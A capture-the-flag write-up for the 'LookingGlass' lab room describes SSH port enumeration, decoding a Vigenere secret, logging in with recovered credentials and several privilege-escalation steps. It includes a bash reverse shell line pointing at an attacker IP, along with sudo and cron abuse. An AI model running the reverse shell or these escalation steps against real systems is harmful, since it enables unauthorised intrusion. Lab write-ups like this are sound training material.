LookingGlass

Target IP: 10.10.14.203

Challenge Description: Step through the looking glass. A sequel to the Wonderland challenge room.

Reconnaissance


There are tons of TCP ports open on the target machine. There is SSH application on port 22, and the rest are open from 9000 to 13999. There is no point performing an aggressive port scan against these open TCP ports.


I tried to grab the banner of the applications of the different ports using nc, and it looks like all application are running SSH as shown above.

Enumeration


I connected to the different ports using ssh. I had problems connecting to the different ports with the keys, so I used the flags -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa. In the output above, the target machine returned the message Lower when I connected to the SSH application on port 9000. When I connected to the SSH application on port 11000, I was told to go Higher. By the looks of it, these messages are in reversed-order; for example, lower means go higher, and vice versa.


After some enumeration, I found a working application. Using the command ssh root@10.10.14.203 -p 10156 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa, I managed to find a real working application on port 10156 and got the encoded message above. It is asking for the secret.


I copied the encoded message and decoded it using a Vigenere Solver, as shown above. The secret I obtained is bewareTheJabberwock.

Exploitation


After entering the secret text, I obtained the string jabberwock:WatchingMightEnglishMatter. Since it looks like login credentials, I used it against the SSH application on port 22 and got a SSH session as the user jabberwock, as shown above. Now I have a foothold on the target machine.

Privilege Escalation


Running cat /etc/crontab shows an interesting cronjob with the name @reboot tweedledum bash /home/jabberwock/twasBrillig.sh, as shown above. The cronjob twasBrillig.sh is located at the home directory of user jabberwock and it is executed as the user tweedledum.


And executing sudo -l shows it's true as the current user jabberwock has the permission to run the command /sbin/reboot with root privileges and without a password.


I have write permission over this script twasBrillig.sh. Meaning I can put my reverse shell script inside this file.


I replaced the content of twasBrillig.sh with bash -i >& /dev/tcp/10.14.55.153/80 0>&1, as shown above. Then I started a listener on port 80 on my machine to catch this reverse shell.


Then I issued the command sudo /sbin/reboot to perform the reboot. And after some time, I gained a reverse shell connection with the session as tweedledum user. I successfully elevated my privileges horizontally from the user jabberwock to tweedledum.


This new user has an interesting file called humptydumpty.txt as shown above. I copied the content of this file and saved it on my machine for further analysis.


Using Cyberchef, I decoded a possible password using the magic recipe as shown above. After decoding it, I obtained the password zyxwvutsrqponmlk. Does this password belong to the current user?


Running sudo -l shows the entry (tweedledee) NOPASSWD: /bin/bash. I used the command sudo -u tweedledee /bin/bash to spawn a shell as this user tweedledee. But this user does not contain anything useful. There are three more users I do not have access to. Maybe the password belongs to one of them?


I tried to switch user to humptydumpty using the password zyxwvutsrqponmlk and it worked!


I got stuck here for some time and needed help, as I did not know what to do next. It turns out the SSH key of user alice can be read by the current user, as shown above. I copied this SSH key to my machine. And using this SSH key, I connected to the target machine via SSH.


I transferred Linpeas to the target machine and executed it. Then I obtained the PE vector information in the picture above. There is no user called ssalg-gnikool; however, this can be a hostname.


And bingo! Using the command sudo -h ssalg-gnikool /bin/bash spawns a root shell.
